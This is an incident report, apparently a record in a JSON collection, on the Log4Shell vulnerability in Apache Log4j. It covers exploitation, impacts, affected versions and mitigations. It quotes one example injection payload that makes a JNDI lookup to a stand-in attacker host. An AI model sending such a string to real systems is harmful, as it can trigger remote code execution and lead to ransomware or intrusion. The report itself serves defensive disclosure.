      "title": "Incident Report: Exploitation of Log4Shell (CVE-2021-44228)",
      "content": "Summary: A critical remote code execution (RCE) vulnerability, identified as CVE-2021-44228 (Log4Shell), was found in the Apache Log4j logging library. Attackers are actively exploiting this vulnerability in the wild. The exploit involves sending a specially crafted string (e.g., `${jndi:ldap://attacker.com/a}`) which, when logged by a vulnerable application using Log4j, triggers a JNDI lookup. This allows attackers to load and execute arbitrary Java code from an attacker-controlled server. Observed impacts include deployment of ransomware, crypto miners, and Cobalt Strike beacons. Initial access often targets public-facing web servers or applications using vulnerable Log4j versions (2.0-beta9 to 2.14.1). Mitigation requires immediate patching to Log4j 2.15.0 or later, disabling JNDI lookups, or removing the JndiLookup class from the classpath. Monitor for outbound LDAP/RMI connections and suspicious Java processes.",
